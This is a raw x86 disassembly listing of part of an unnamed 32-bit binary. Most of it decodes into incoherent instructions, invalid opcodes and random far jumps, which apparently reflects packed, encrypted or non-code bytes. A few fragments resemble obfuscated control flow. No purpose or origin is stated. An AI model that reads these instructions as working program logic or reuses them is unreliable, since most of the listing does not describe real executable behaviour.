  4130f5:	adc    al,0x13
  4130f7:	pushf  
  4130f8:	mul    BYTE PTR [eax-0x20]
  4130fb:	and    eax,0x5fb2da4a
  413100:	mov    eax,ds:0x9b1d19f5
  413105:	mov    al,0x34
  413107:	inc    edi
  413108:	mov    esp,0x66532502
  41310d:	mov    BYTE PTR [ebx+0x17],cl
  413110:	jmp    0xdb8d:0xf038027c
  413117:	fidivr WORD PTR [ebp+0x653509b9]
  41311d:	mov    dl,0x84
  41311f:	xchg   edi,eax
  413120:	ja     0x4130e8
  413122:	and    eax,ecx
  413124:	xor    DWORD PTR [eax],edi
  413126:	dec    esi
  413127:	(bad)  
  413128:	lock cld 
  41312a:	std    
  41312b:	daa    
  41312c:	scas   eax,DWORD PTR es:[edi]
  41312d:	sbb    eax,0x46aee084
  413132:	cmc    
  413133:	call   0x6b1b996a
  413138:	sbb    eax,0x2a019d7
  41313d:	cmp    DWORD PTR [ebx-0x68c3f410],esp
  413143:	mov    BYTE PTR [esi-0x76f17085],al
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	sub    eax,0xa3034c86
  413183:	popa   
  413184:	jo     0x4131f6
  413186:	mov    ecx,0xe570707e
  41318b:	mov    bh,0xbd
  41318d:	mov    bh,0xc8
  41318f:	ss jnp 0x413203
  413192:	int3   
  413193:	pop    es
  413194:	adc    eax,0x58be8445
  413199:	dec    esi
  41319a:	adc    BYTE PTR [edi],ch
  41319c:	xchg   esp,eax
  41319d:	sbb    eax,0x3ebdbb69
  4131a2:	jne    0x413126
  4131a4:	sub    al,0x4
  4131a6:	leave  
  4131a7:	sub    ah,bh
  4131a9:	push   esp
  4131aa:	pop    ss
  4131ab:	cmp    DWORD PTR [esp+esi*1],ecx
  4131ae:	(bad)  
  4131b0:	sub    eax,0xf5eeda94
  4131b5:	inc    eax
  4131b6:	outs   dx,BYTE PTR ds:[esi]
  4131b7:	imul   DWORD PTR [edx+0x3b]
  4131ba:	test   BYTE PTR ds:0x86405de3,dl
  4131c0:	shr    DWORD PTR [esi-0x59432e44],0x40
  4131c7:	leave  
  4131c8:	dec    edi
  4131c9:	mov    ebp,DWORD PTR [edi+0x3]
  4131cc:	in     eax,dx
  4131cd:	ja     0x4131e7
  4131cf:	xchg   esi,eax
  4131d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131d1:	push   ss
  4131d2:	(bad)  
  4131d3:	jne    0x4131ee
  4131d5:	mov    al,0xcc
  4131d7:	test   eax,0x5d29e103
  4131dc:	pop    ebx
  4131dd:	adc    eax,0x9fdda81e
  4131e2:	jle    0x41316a
  4131e4:	pop    esi
  4131e5:	in     eax,0x6a
  4131e7:	cmp    bl,cl
  4131e9:	lods   eax,DWORD PTR ds:[esi]
  4131ea:	add    ecx,DWORD PTR [ebx+esi*4-0x68]
  4131ee:	xlat   BYTE PTR ds:[ebx]
  4131ef:	test   esp,eax
  4131f1:	outs   dx,DWORD PTR ds:[esi]
  4131f2:	dec    edi
  4131f3:	mov    ecx,0x5ea2bb53
  4131f8:	mov    eax,ds:0x6cb077f4
  4131fd:	dec    ebx
  4131fe:	stos   DWORD PTR es:[edi],eax
  4131ff:	repnz dec edx
  413201:	in     al,dx
  413202:	jne    0x4131cf
  413204:	ds ins BYTE PTR es:[edi],dx
  413206:	push   ds
  413207:	mov    gs:0xf16d06fc,eax
  41320d:	jb     0x4131e9
  41320f:	push   esp
  413210:	jg     0x413270
  413212:	sbb    DWORD PTR [eax],0x2fcb4151
  413218:	add    BYTE PTR [edi],dh
  41321a:	adc    esi,DWORD PTR [ebx]
  41321c:	data16 jge 0x4131a0
  41321f:	rcr    ebp,cl
  413221:	nop
  413222:	lods   al,BYTE PTR ds:[esi]
  413223:	jle    0x41322c
  413225:	out    dx,al
  413226:	push   esi
  413227:	and    eax,0xd4a93831
  41322c:	pop    esi
  41322d:	sbb    eax,0x33a46e1d
  413232:	xchg   esi,eax
  413233:	dec    edx
  413234:	imul   edi,edx,0x4402bbc8
  41323a:	call   0x860b72a3
  41323f:	mov    BYTE PTR ds:0x204d041,bl
  413245:	iret   
  413246:	rol    DWORD PTR ds:0x7ff2b8e9,0x5f
  41324d:	sub    BYTE PTR [ebx],ch
  41324f:	js     0x413226
  413251:	lahf   
  413252:	mov    dh,0xd0
  413254:	push   edi
  413255:	sbb    eax,0x79e98e8d
  41325a:	(bad)  
  41325b:	not    cl
  41325d:	shl    BYTE PTR [edi],cl
  41325f:	push   cs
  413260:	mov    ebp,0xc3669a62
  413265:	mov    dl,0xa1
  413267:	retf   0x6109
  41326a:	sbb    BYTE PTR [ecx],bl
  41326c:	xor    eax,0xce584661
  413271:	xchg   DWORD PTR [edi],esi
  413273:	fisubr DWORD PTR [eax]
  413275:	pop    edx
  413276:	test   BYTE PTR [esi+0x7c],ch
  413279:	(bad)  
  41327b:	faddp  st(4),st
  41327d:	cwde   
  41327e:	in     eax,0x69
  413280:	enter  0x2555,0xff
  413284:	imul   esp,edi,0x5a
  413287:	fild   QWORD PTR [ecx+0xd08500f]
  41328d:	outs   dx,BYTE PTR ds:[esi]
  41328e:	ret    
  41328f:	je     0x41322d
  413291:	outs   dx,DWORD PTR ds:[esi]
  413292:	jno    0x4132ae
  413294:	je     0x41325f
  413296:	jbe    0x26686a27
  41329c:	mov    al,ds:0x8f6636e6
  4132a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a2:	xchg   ecx,eax
  4132a3:	sbb    bl,dh
  4132a5:	lahf   
  4132a6:	mov    al,ds:0x6eaaec45
  4132ab:	xor    eax,0x55da67d6
  4132b0:	xor    ecx,edx
  4132b2:	and    BYTE PTR [ecx-0x4d],bl
  4132b5:	popf   
  4132b6:	mov    ebx,0xb33fbf64
  4132bb:	nop
  4132bc:	and    eax,0x76a238df
  4132c1:	jle    0x413278
  4132c3:	mov    eax,ds:0x26d377cf
  4132c8:	add    DWORD PTR [eax],esp
  4132ca:	add    ah,BYTE PTR [ebx-0x9389e81]
  4132d0:	xchg   BYTE PTR [ebp-0x4bacdf56],cl
  4132d6:	in     al,0x27
  4132d8:	jo     0x413359
  4132da:	call   0xe68d99fb
  4132df:	mul    BYTE PTR [eax+0x73]
  4132e2:	sub    al,ah
  4132e4:	and    ch,BYTE PTR [esi+eax*2]
  4132e7:	cmc    
  4132e8:	pop    esp
  4132e9:	push   ds
  4132ea:	mov    al,ds:0x6b9ee765
  4132ef:	jno    0x41332e
  4132f1:	fcomi  st,st(7)
  4132f3:	push   es
  4132f4:	push   esi
  4132f5:	js     0x4132da
  4132f7:	cld    
  4132f8:	cs adc eax,0xd51babe5
  4132fe:	jmp    0xc6a3908a
  413303:	setne  BYTE PTR [ecx-0x3de46b05]
  41330a:	xchg   bl,ch
  41330c:	fist   DWORD PTR [edx+0x1fd9a2c9]
  413312:	mov    cl,0x4c
  413314:	mov    cl,0x7f
  413316:	fisub  WORD PTR [eax-0x5b]
  413319:	cmp    BYTE PTR [esi+0x2087c02],0x16
  413320:	aas    
  413321:	xchg   ebx,eax
  413322:	fistp  QWORD PTR [ebp+0x6e]
  413325:	inc    ecx
  413326:	idiv   DWORD PTR ds:0x48de1b30
  41332c:	mov    ah,0x11
  41332e:	push   es
  41332f:	scas   al,BYTE PTR es:[edi]
  413330:	or     eax,0xe74069cb
  413335:	add    esp,eax
  413337:	rol    bh,0xd4
  41333a:	push   0xffffffab
  41333c:	add    ah,BYTE PTR [ebp-0x34]
  41333f:	rcl    BYTE PTR ds:0x1c5bb35,cl
  413345:	ss call 0x6b3d:0x54684d39
  41334d:	(bad)  
  41334e:	jle    0x41330e
  413350:	mov    cl,0xb8
  413352:	data16 loop 0x4132fd
  413355:	sahf   
  413356:	and    eax,0x109a218
  41335b:	mov    dh,0x6a
  41335d:	jo     0x41336d
  41335f:	repnz sub ch,ah
  413362:	sbb    DWORD PTR [eax+0x62],edi
  413365:	dec    ebp
  413366:	dec    edx
  413367:	add    edx,DWORD PTR [eax]
  413369:	xor    al,0x7e
  41336b:	push   edx
  41336c:	pop    esp
  41336d:	inc    edx
  41336e:	sub    ebp,ebx
  413370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413371:	out    dx,al
  413372:	stos   BYTE PTR es:[edi],al
  413373:	lahf   
  413374:	jmp    0x4132fa
  413376:	add    dl,BYTE PTR [esi]
  413378:	shr    ebx,cl
  41337a:	mov    al,0xed
  41337c:	(bad)  
  41337e:	and    esi,eax
  413380:	in     al,0xa2
  413382:	fwait
  413383:	xchg   ebx,eax
  413384:	and    DWORD PTR [esi],edx
  413386:	jnp    0x413362
  413388:	ds mov ch,0xea
  41338b:	pusha  
  41338c:	mov    BYTE PTR [ecx+0x72bb6984],dh
  413392:	pop    edi
  413393:	sbb    cl,bl
  413395:	clc    
  413396:	jae    0x41332f
  413398:	dec    ebp
  413399:	fnsave [eax+ebx*4-0x91e97c4]
  4133a0:	stos   DWORD PTR es:[edi],eax
  4133a1:	jp     0x41340a
  4133a3:	neg    ah
  4133a5:	sti    
  4133a6:	mov    edi,0x40b83343
  4133ab:	test   DWORD PTR [edx],esp
  4133ad:	clc    
  4133ae:	std    
  4133af:	mov    ebp,0x61fca22b
  4133b4:	das    
  4133b5:	ja     0x413357
  4133b7:	inc    edx
  4133b8:	in     al,0x47
  4133ba:	fistp  QWORD PTR [eax]
  4133bc:	cmp    eax,0x3a761a4f
  4133c1:	addr16 mov ds:0xf2a9,eax
  4133c5:	sbb    eax,0x753f4b78
  4133ca:	inc    esi
  4133cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133cc:	fst    QWORD PTR [ebp-0x28e22a90]
  4133d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133d3:	(bad)  
  4133d4:	int3   
  4133d5:	cmc    
  4133d6:	enter  0x86bb,0x8b
  4133da:	pop    edi
  4133db:	mul    BYTE PTR [ebx-0x1c]
  4133de:	lds    esi,FWORD PTR [eax+0x6c02f7b1]
  4133e4:	sbb    dl,bl
  4133e6:	fcomp  DWORD PTR [ebp+0x2c6775b9]
  4133ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ed:	push   di
  4133ef:	jo     0x4133df
  4133f1:	push   cs
  4133f2:	push   ebx
  4133f3:	lea    edi,[ebx+eax*1]
  4133f6:	mov    BYTE PTR [edx+0x33d58d0],bl
  4133fc:	arpl   WORD PTR ds:0x9451e2a6,sp
  413402:	dec    edi
  413403:	lods   eax,DWORD PTR ds:[esi]
  413404:	test   eax,0x61a76152
  413409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41340a:	lods   eax,DWORD PTR ds:[esi]
  41340b:	jl     0x413410
  41340d:	push   edi
  41340e:	(bad)  
  41340f:	jecxz  0x4133af
  413411:	dec    esi
  413412:	int    0x8d
  413414:	dec    esp
  413415:	push   0xffffffd5
  413417:	pop    esp
  413418:	jmp    0xa925:0xe345d68f
  41341f:	sbb    bh,BYTE PTR [ebp+ebx*4+0x25]
  413423:	adc    DWORD PTR [esi+0x66],0x459a71ac
  41342a:	outs   dx,BYTE PTR ds:[esi]
  41342b:	push   cs
  41342c:	in     al,dx
  41342d:	sub    eax,0x3656bb1a
  413432:	int3   
  413433:	add    DWORD PTR [edi+0x32],eax
  413436:	mov    esi,0x5bd4c5c5
  41343b:	out    0xc0,al
  41343d:	xchg   esp,eax
  41343e:	div    BYTE PTR [edx]
  413440:	ins    DWORD PTR es:[edi],dx
  413441:	add    DWORD PTR [ecx+esi*4+0x27fc72ff],0x43
  413449:	call   0xd8c:0xcdc2fa2f
  413450:	ins    DWORD PTR es:[edi],dx
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x50c23a0f,al
  413492:	lahf   
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x8370707e
  41349c:	sub    DWORD PTR [ebx-0x4b],esi
  41349f:	jg     0x41346d
  4134a1:	gs (bad) 
  4134a3:	adc    al,cl
  4134a5:	push   ds
  4134a6:	dec    esp
  4134a7:	test   BYTE PTR [edi-0x44f3eb90],0xc6
  4134ae:	jns    0x4134dd
  4134b0:	in     eax,dx
  4134b1:	pop    ebp
  4134b2:	jmp    0x413475
  4134b4:	out    dx,al
  4134b5:	pusha  
  4134b6:	add    DWORD PTR [esi+0x4c],esi
  4134b9:	fadd   QWORD PTR [esi-0x1f2d0c03]
  4134bf:	scas   eax,DWORD PTR es:[edi]
  4134c0:	push   ecx
  4134c1:	and    al,0xac
  4134c3:	add    al,0xd6
  4134c5:	pop    esi
  4134c6:	fild   WORD PTR [esp+esi*1]
  4134c9:	push   eax
  4134ca:	sahf   
  4134cb:	dec    ebp
  4134cc:	sbb    ch,BYTE PTR [eax-0x6]
  4134cf:	xor    eax,0x98b51812
  4134d4:	add    al,0xd8
  4134d6:	dec    ecx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	adc    al,0x61
  4134da:	test   DWORD PTR [edx+ebp*8+0x21],ecx
  4134de:	fwait
  4134df:	xor    DWORD PTR [esp+ebx*4],0x22
  4134e3:	sub    eax,0x22012ca1
  4134e8:	rcl    DWORD PTR [ecx-0x6],cl
  4134eb:	jmp    0x4fd75d69
  4134f0:	mov    eax,0x96a377fb
  4134f5:	les    edi,FWORD PTR [edi+0x34]
  4134f8:	and    edx,DWORD PTR [esi-0x7b]
  4134fb:	call   0xd456:0xe442c2d2
  413502:	mov    eax,ds:0xd50d921
  413507:	scas   al,BYTE PTR es:[edi]
  413508:	mov    edi,0xe311a8f7
  41350d:	or     esi,DWORD PTR [ebp+ebp*4-0x39]
  413511:	aaa    
  413512:	imul   edx,DWORD PTR [ebp-0x51],0x28308063
  413519:	and    BYTE PTR [ecx],0x6d
  41351c:	adc    al,0x21
  41351e:	int    0xb1
  413520:	jecxz  0x413560
  413522:	and    BYTE PTR [edx+0x6968891c],dl
  413528:	add    eax,0xdfae3696
  41352d:	lds    eax,FWORD PTR [ebx+edi*1+0x5e53c02]
  413534:	adc    DWORD PTR [ebx],edi
  413536:	ins    DWORD PTR es:[edi],dx
  413537:	jbe    0x4134f2
  413539:	aas    
  41353a:	pop    esp
  41353b:	nop
  41353c:	pusha  
  41353d:	fidiv  WORD PTR [ecx-0x4e20956f]
  413543:	push   0xccbedd1
  413548:	or     eax,0xb624721c
  41354d:	dec    ecx
  41354e:	nop
  41354f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413550:	xor    DWORD PTR [ecx],edx
  413552:	inc    esi
  413553:	dec    esp
  413554:	das    
  413555:	push   ds
  413556:	cmp    eax,0xb6e42c84
  41355b:	(bad)  
  41355c:	add    DWORD PTR [esi+edi*4],edx
  41355f:	pop    ss
  413560:	xlat   BYTE PTR ds:[ebx]
  413561:	push   eax
  413562:	xchg   esp,eax
  413563:	sbb    al,0xde
  413565:	cmp    al,0xdd
  413567:	rcr    BYTE PTR [ebp-0x65a35d6b],cl
  41356d:	stc    
  41356e:	fisttp DWORD PTR [ecx]
  413570:	arpl   si,di
  413572:	cmc    
  413573:	loope  0x4135bf
  413575:	adc    DWORD PTR [ebx],0xda01c2fa
  41357b:	daa    
  41357c:	rcr    ebp,0xe3
  41357f:	test   BYTE PTR ds:0xc8062893,cl
  413585:	sbb    ecx,DWORD PTR [eax-0x50]
  413588:	inc    eax
  413589:	pop    ecx
  41358a:	mov    ah,0xc6
  41358c:	loop   0x413577
  41358e:	lds    ecx,FWORD PTR [edx-0x41]
  413591:	jle    0x413516
  413593:	in     al,dx
  413594:	jmp    0x635db5fe
  413599:	adc    ch,BYTE PTR [esi+0x26f12cf6]
  41359f:	sbb    eax,0x246818f2
  4135a4:	or     al,0x25
  4135a6:	loop   0x41360d
  4135a8:	call   0xe243:0x9dc6f28e
  4135af:	or     eax,0x6adb3598
  4135b4:	hlt    
  4135b5:	mov    esi,0xf5b410c7
  4135ba:	mov    al,ds:0xf56fa253
  4135bf:	es test cl,dh
  4135c2:	mov    edx,0x8c5bf866
  4135c7:	adc    bl,dl
  4135c9:	lock mov dh,0x6c
  4135cc:	pop    ebp
  4135cd:	xchg   ebp,eax
  4135ce:	icebp  
  4135cf:	xor    DWORD PTR [ebp+ebp*1-0x71],edi
  4135d3:	cmc    
  4135d4:	call   0x631b:0x36328855
  4135db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135dc:	(bad)  
  4135dd:	int3   
  4135de:	stos   BYTE PTR es:[edi],al
  4135df:	push   eax
  4135e0:	inc    edx
  4135e1:	cmp    bh,BYTE PTR [ebx-0x7455f15a]
  4135e7:	xchg   edi,eax
  4135e8:	(bad)
  4135eb:	or     al,0x58
  4135ed:	aaa    
  4135ee:	int3   
  4135ef:	retf   0x16ac
  4135f2:	jle    0x41357d
  4135f4:	or     al,0xce
  4135f6:	or     eax,DWORD PTR [ecx+eiz*4]
  4135f9:	dec    ebx
  4135fa:	xchg   edi,eax
  4135fb:	mov    edx,0xd2641c47
  413600:	inc    esi
  413601:	jp     0x41364d
  413603:	(bad)  
  413604:	xor    al,0x6c
  413606:	call   0xdcf4d228
  41360b:	cmp    eax,0xfb3abcf0
  413610:	mov    al,ds:0xb3c52e34
  413615:	rcr    DWORD PTR [ebp+0x3a],1
  413618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413619:	or     DWORD PTR [ecx-0x52],esi
  41361c:	cmc    
  41361d:	jne    0x4135d5
  41361f:	adc    al,BYTE PTR [esi-0x43]
  413622:	out    dx,al
  413623:	hlt    
  413624:	add    dl,BYTE PTR [eax-0x6]
  413627:	xchg   edi,eax
  413628:	push   0xad3bcecd
  41362d:	jmp    0x2c9a:0x2a35bf0
  413634:	mov    ds:0x98095486,eax
  413639:	nop
  41363a:	ror    eax,cl
  41363c:	inc    eax
  41363d:	adc    eax,0x5785612d
  413642:	retf   0xb50e
  413645:	adc    BYTE PTR [esi],bl
  413647:	mov    ebp,0x9bbcf51e
  41364c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41364d:	jmp    0x413675
  41364f:	mov    dh,0x70
  413651:	mov    al,ds:0x5c518cb1
  413656:	mov    edx,0x8a5a11dd
  41365b:	retf   0x62a9
  41365e:	lock xchg esi,eax
  413660:	popf   
  413661:	adc    BYTE PTR [eax+edi*8],dh
  413664:	popf   
  413665:	mov    BYTE PTR gs:[esi-0x30],dh
  413669:	retf   
  41366a:	xchg   ebx,eax
  41366b:	aas    
  41366c:	repz aad 0x79
  41366f:	dec    ebx
  413670:	inc    ecx
  413671:	or     DWORD PTR [edi],0x5d
  413674:	push   ds
  413675:	push   ebx
  413676:	mov    WORD PTR [edx-0x60eb8f2e],ds
  41367c:	lock xchg eax,ecx
  41367f:	stc    
  413680:	mov    eax,ds:0x254abb0a
  413685:	sbb    ch,BYTE PTR [eax-0x78]
  413688:	cmp    ebp,esi
  41368a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41368c:	ret    
  41368d:	xchg   dh,bh
  41368f:	mov    bh,0x9e
  413691:	adc    ch,BYTE PTR ds:[edi+0x2e]
  413695:	add    ebx,ecx
  413697:	fwait
  413698:	clc    
  413699:	imul   edi,DWORD PTR ds:0x91c23101,0xfba3f3ce
  4136a3:	ja     0x41362b
  4136a5:	popf   
  4136a6:	add    eax,ebx
  4136a8:	(bad)  
  4136a9:	pop    edi
  4136aa:	data16 sti 
  4136ac:	test   eax,0x336b0d84
  4136b1:	repz scas al,BYTE PTR es:[edi]
  4136b3:	js     0xd3f8d34f
  4136b9:	mov    cl,0x66
  4136bb:	add    edx,DWORD PTR [ebp+edx*1+0x5cde89c0]
  4136c2:	pop    eax
  4136c3:	adc    eax,0x9b75dc1e
  4136c8:	push   esp
  4136c9:	cmp    DWORD PTR ds:0xdee9fe8c,eax
  4136cf:	std    
  4136d0:	or     BYTE PTR [edi-0xd97c9a1],ch
  4136d6:	pop    es
  4136d7:	je     0x4136d4
  4136d9:	jle    0x413704
  4136db:	cmp    DWORD PTR [edx-0x85d7c47],ebx
  4136e1:	cmp    edx,DWORD PTR [edi-0x7f3d8c93]
  4136e7:	fsub   QWORD PTR [edx]
  4136e9:	out    0xa,eax
  4136eb:	cmp    cl,bh
  4136ed:	fadd   DWORD PTR [ebp-0x20]
  4136f0:	mov    edx,0xec54bbe5
  4136f5:	mov    BYTE PTR [ebx+0x433f4c9],0xb5
  4136fc:	cmp    al,0x1d
  4136fe:	out    dx,al
  4136ff:	sub    al,0xf
  413701:	push   edx
  413702:	sti    
  413703:	add    BYTE PTR [ebp+ebx*1+0x6f],cl
  413707:	bound  esp,QWORD PTR [edi+0x732ad125]
  41370d:	dec    edx
  41370e:	loop   0x413695
  413710:	and    eax,0x7e7e8b1f
  413715:	movsx  ebp,BYTE PTR [esi+0x12a6b57a]
  41371c:	lock (bad) 
  41371e:	xor    DWORD PTR [esi+ebx*8],edx
  413721:	clc    
  413722:	mov    eax,0x8fd924b4
  413727:	call   0x5a3dfac1
  41372c:	test   BYTE PTR [edi],bh
  41372e:	sub    BYTE PTR [esi],cl
  413730:	inc    edx
  413731:	xor    eax,0x3c542a03
  413736:	fdivp  st(3),st
  413738:	and    BYTE PTR [ecx],ch
  41373a:	sbb    cl,BYTE PTR [ecx-0x30a253f0]
  413740:	cmp    ecx,0xffffffd0
  413743:	xchg   ebx,eax
  413744:	daa    
  413745:	mov    al,ds:0xe12fd7f6
  41374a:	dec    ebx
  41374b:	ror    BYTE PTR [eax+esi*8-0x51c7ec54],1
  413752:	inc    esi
  413753:	outs   dx,BYTE PTR ds:[esi]
  413754:	xor    ebp,DWORD PTR [eax-0x30996383]
  41375a:	call   DWORD PTR [edi-0x18d61c70]
  413760:	lahf   
  413761:	xor    al,0x3b
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	sbb    edx,DWORD PTR [edx+0x6b357937]
  413784:	jo     0x4137f6
  413786:	mov    ecx,0xd670707e
  41378b:	and    dh,BYTE PTR [ecx-0x4169a3c6]
  413791:	aas    
  413792:	adc    ecx,DWORD PTR [esi-0x3a]
  413795:	arpl   WORD PTR [ebx+0x37],ax
  413798:	mov    esp,cs
  41379a:	shl    al,0xd0
  41379d:	jnp    0x4137a3
  41379f:	jnp    0x413786
  4137a1:	stos   DWORD PTR es:[edi],eax
  4137a2:	push   esp
  4137a3:	cmp    BYTE PTR [esi-0x36],al
  4137a6:	adc    BYTE PTR [esi-0x2756aac9],dh
  4137ac:	inc    ebx
  4137ad:	outs   dx,DWORD PTR ds:[esi]
  4137ae:	cmp    al,0x33
  4137b0:	xor    BYTE PTR [eax+ecx*8-0x22da6ec7],ch
  4137b7:	mov    ds:0xabd19ea,eax
  4137bc:	sub    al,0x27
  4137be:	pop    eax
  4137bf:	mov    al,0x25
  4137c1:	inc    ebp
  4137c2:	and    esi,DWORD PTR ds:0x40446772
  4137c8:	add    al,BYTE PTR [edi]
  4137ca:	out    dx,al
  4137cb:	inc    eax
  4137cc:	sbb    dh,al
  4137ce:	pushf  
  4137cf:	and    eax,0x3596b581
  4137d4:	inc    edx
  4137d5:	pop    ecx
  4137d6:	popa   
  4137d7:	or     al,BYTE PTR [eax]
  4137d9:	jae    0x4137a6
  4137db:	int    0xcf
  4137dd:	daa    
  4137de:	push   0x1b
  4137e0:	dec    esp
  4137e1:	xor    ecx,DWORD PTR [edi]
  4137e3:	adc    eax,0xee5815a2
  4137e8:	sub    eax,0xfb5a1749
  4137ed:	lds    ebx,FWORD PTR [eax]
  4137ef:	mov    ah,0xc
  4137f1:	adc    DWORD PTR [esi],0x10
  4137f4:	pushf  
  4137f5:	adc    DWORD PTR [ebx+esi*4-0x6d903020],0x35
  4137fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137fe:	add    al,0x51
  413800:	mov    WORD PTR [esi],?
  413802:	push   ebx
  413803:	push   ecx
  413804:	dec    edx
  413805:	add    edx,DWORD PTR [ebx+0x48293f7f]
  41380b:	cmc    
  41380c:	push   ebp
  41380d:	cwde   
  41380e:	sahf   
  41380f:	and    eax,ebp
  413811:	enter  0xc318,0x77
  413815:	in     eax,0x39
  413817:	(bad)  
  413818:	mov    esp,0xcc2e37ad
  41381d:	mov    cl,0xdb
  41381f:	mov    ebx,0x294b1872
  413824:	cmp    DWORD PTR [ebx-0x35908e66],edi
  41382a:	loop   0x413800
  41382c:	scas   eax,DWORD PTR es:[edi]
  41382d:	inc    esi
  41382e:	xchg   edi,eax
  41382f:	push   edi
  413830:	adc    DWORD PTR [ebx+0x186a78fc],ecx
  413836:	xchg   ecx,eax
  413837:	adc    al,0xb8
  413839:	stos   DWORD PTR es:[edi],eax
  41383a:	or     eax,0x4563c70c
  41383f:	add    DWORD PTR [eax-0xdc2699a],edi
  413845:	fwait
  413846:	add    BYTE PTR [eax+ecx*2+0x2d],dh
  41384a:	(bad)  
  41384b:	xchg   edi,eax
  41384c:	repnz sbb al,0x82
  41384f:	dec    esi
  413850:	stc    
  413851:	jl     0x41384b
  413853:	stos   DWORD PTR es:[edi],eax
  413854:	sub    eax,0x5fe7ce3b
  413859:	test   DWORD PTR [ebp+0x6f615952],0x95428ecd
  413863:	inc    edi
  413864:	xchg   DWORD PTR [ecx],ecx
  413866:	jge    0x4138ad
  413868:	daa    
  413869:	pop    edi
  41386a:	dec    ebp
  41386b:	inc    esi
  41386c:	scas   al,BYTE PTR es:[edi]
  41386d:	scas   eax,DWORD PTR es:[edi]
  41386e:	push   edx
  41386f:	adc    ch,bh
  413871:	and    ch,BYTE PTR [ecx-0x74]
  413874:	push   es
  413875:	mov    db7,edi
  413878:	or     eax,0xa63959d4
  41387d:	or     edx,DWORD PTR [esi-0x2e81fb57]
  413883:	or     eax,0x27bc670d
  413888:	daa    
  413889:	rol    DWORD PTR ds:[ecx],1
  41388c:	pop    ebp
  41388d:	mov    eax,0xf53ce4b7
  413892:	outs   dx,BYTE PTR ds:[esi]
  413893:	mov    ds:0xe01297dc,eax
  413898:	jp     0x4138fd
  41389a:	mov    al,0x3c
  41389c:	out    0x4c,al
  41389e:	push   edx
  41389f:	push   ebx
  4138a0:	jmp    0x37b42a39
  4138a5:	xlat   BYTE PTR ds:[ebx]
  4138a6:	push   0xef230fc9
  4138ab:	out    0x3d,al
  4138ad:	out    dx,al
  4138ae:	adc    eax,0xa6e8664
  4138b3:	push   ecx
  4138b4:	(bad)  
  4138b5:	les    eax,FWORD PTR [ebp-0x7a724437]
  4138bb:	mov    ah,0xb1
  4138bd:	in     eax,0xa3
  4138bf:	add    al,0x5
  4138c1:	cmp    DWORD PTR [ecx+0x66],0x35649469
  4138c8:	aaa    
  4138c9:	sbb    al,0x8a
  4138cb:	jb     0x4138a2
  4138cd:	mov    esi,0x4d7f354e
  4138d2:	enter  0xdf21,0x4b
  4138d6:	mov    cl,0x82
  4138d8:	xchg   DWORD PTR es:0x83dad36d,ecx
  4138df:	loopne 0x4138e1
  4138e1:	sub    eax,0x42b3f604
  4138e6:	popa   
  4138e7:	jnp    0x413926
  4138e9:	xchg   edx,eax
  4138ea:	mov    ebp,0x1858bb71
  4138ef:	ja     0x413893
  4138f1:	pushfw 
  4138f3:	loope  0x4138be
  4138f5:	mov    edx,0x12e39b89
  4138fa:	xor    dl,bl
  4138fc:	push   esp
  4138fd:	mov    ah,0x64
  4138ff:	mov    ch,0x8e
  413901:	(bad)  
  413902:	into   
  413903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413904:	xchg   ebp,eax
  413905:	push   esi
  413906:	push   edi
  413907:	sbb    eax,0x775b0e03
  41390c:	pusha  
  41390d:	shl    DWORD PTR [esi-0x37dd0ada],cl
  413913:	cdq    
  413914:	sti    
  413915:	stos   DWORD PTR es:[edi],eax
  413916:	in     al,dx
  413917:	lea    edi,[ebx-0x12eac4a9]
  41391d:	rol    DWORD PTR [ecx],1
  41391f:	mov    dh,0x33
  413921:	frstor [esi-0x2a08a189]
  413927:	stos   BYTE PTR es:[edi],al
  413928:	cmp    ebp,eax
  41392a:	inc    edx
  41392b:	push   ds
  41392c:	sub    al,0x4
  41392e:	adc    DWORD PTR [eax-0x46],eax
  413931:	imul   ebp,DWORD PTR ds:0xa4efdd5f,0x5c
  413938:	int3   
  413939:	cmp    eax,0xe146e30d
  41393e:	pusha  
